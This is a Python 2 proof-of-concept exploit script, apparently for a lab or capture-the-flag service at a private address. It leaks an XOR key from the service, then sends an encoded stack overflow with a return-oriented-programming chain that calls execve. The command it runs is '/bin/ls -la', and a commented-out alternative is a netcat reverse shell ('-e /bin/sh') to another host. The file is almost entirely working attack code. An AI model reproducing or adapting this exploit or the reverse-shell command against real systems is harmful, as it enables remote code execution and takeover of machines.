
from struct import pack, unpack
from socket import *

BUFF_LEN = 0x2000c + 4 #32 * 4096 + 250

def recv_all(s):

	d = s.recv(1024)
	while d[-1] != '\n':
	
		d += s.recv(1)

	return d


def recv_by_size(s, size):

	d = s.recv(size)
	while len(d) != size:

		d += s.recv(size - len(d))

	return d

def encode(st, k):

	d = ""
	for i in xrange(len(st)):

		d += chr(ord(st[i]) ^ k[i % 0x80])
		
	return d

def poc(host, port):

	command =  "/bin/ls\x00" # "/bin/nc.traditional\x00"
	parameter = " -la\x00" # " -e /bin/sh 10.0.0.5 1234\x00"
	keybuf = []
	s = socket()
	s.settimeout(10)
	s.connect((host, port))
	
	s.send("E")

	s.send(pack("<I", 0x80))
	s.send("A" * 0x80)
	recv_all(s)
	recv_all(s)

	s.recv(4)

	d = s.recv(0x80)
	keybuf = [ord(i) ^ ord("A") for i in d]
	
	print "key buf : " + " ".join([hex(i) for i in keybuf])

	s.send("E")

	payload = ""
	payload += "A" * (BUFF_LEN - len(payload))
	
	#
	# exit(3) poc at the end
	#

	payload += pack("<I", 0x0804952d) 		# nread - read command
	payload += pack("<I", 0x080499bc) 		# pop %ebx | pop %esi | pop %edi | pop %ebp | ret
	payload += pack("<I", 0x00000000) 		# read from stdin
	payload += pack("<I", 0x0804b420) 		# write location
	payload += pack("<I", len(command)) 	# read size

	payload += pack("<I", 0x44444444) 		# ebp
	
	# file name read
	payload += pack("<I", 0x0804952d) 		# nread - read command
	payload += pack("<I", 0x080499bc) 		# pop %ebx | pop %esi | pop %edi | pop %ebp | ret
	payload += pack("<I", 0x00000000) 		# read from stdin
	payload += pack("<I", 0x0804b410) 		# write location
	payload += pack("<I", 0x00000004) 		# read size

	payload += pack("<I", 0x44444444) 		# ebp
	
	# argv read
	payload += pack("<I", 0x0804952d) 		# nread parameter
	payload += pack("<I", 0x080499bc) 		# pop %ebx | pop %esi | pop %edi | pop %ebp | ret
	payload += pack("<I", 0x00000000) 		# read from stdin
	payload += pack("<I", 0x0804b440) 		# write location
	payload += pack("<I", len(parameter)) 	# read size

	payload += pack("<I", 0x44444444) 		# ebp
	
	# call to execve

	payload += pack("<I", 0x080489b0) 		# <execve@plt>
	payload += pack("<I", 0x080499bc) 		# pop %ebx | pop %esi | pop %edi | pop %ebp | ret
	
	# execve parameter

	payload += pack("<I", 0x0804b420) 		# file name
	payload += pack("<I", 0x0804b410) 		# argv
	payload += pack("<I", 0x00000000) 		# env

	# soft exit

	payload += pack("<I", 0x41414141) 		# pop %ebx | ret
	payload += pack("<I", 0x08048818) 		# pop %ebx | ret
	payload += pack("<I", 0x0804b3c4) 		# R_386_JUMP_SLOT   exit
	payload += pack("<I", 0x08049fe3) 		# call *(%ebx)
	payload += pack("<I", 0x00000002) 		# exit_code

	
	r = encode(payload, keybuf)

	s.send(pack("<I", len(r)))
	s.send(r)

	recv_all(s)

	print "size : %d " % unpack("<I", s.recv(4))

	ret = recv_by_size(s, len(payload))
	
	print "recv %d byte %c" % (len(ret), ret[-1])

	s.send("Q")

	s.send(command)

	s.send(pack("<I", 0x0804b440))

	s.send(parameter)


if __name__ == '__main__':
	poc("10.0.0.14", 0x4e22)



'''
exit(x) poc:
	# payload += pack("<I", 0x08048818) # pop %ebx | ret
	# payload += pack("<I", 0x0804b3c4) # R_386_JUMP_SLOT   exit
	# payload += pack("<I", 0x08049fe3) # call *(%ebx)

'''
